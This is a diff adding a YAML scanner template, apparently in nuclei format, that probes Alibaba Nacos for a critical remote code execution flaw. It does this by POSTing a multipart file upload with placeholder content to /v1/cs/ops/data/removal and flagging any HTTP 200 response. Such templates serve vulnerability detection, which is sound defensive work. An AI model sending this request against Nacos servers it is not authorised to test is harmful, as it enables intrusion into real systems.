@@ -1,0 +1,22 @@
+id: yaml-poc-alibaba-nacos-rce-CT-1374034
+info:
+  name: Yaml Poc Alibaba Nacos Rce Ct 1374034
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-alibaba-nacos-rce-CT-1374034'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /{{value}}v1/cs/ops/data/removal
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"file\"; filename=\"{{r1}}\"\r\nContent-Type: application/octet-stream\r\
+    \n\r\n{{r2}}\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
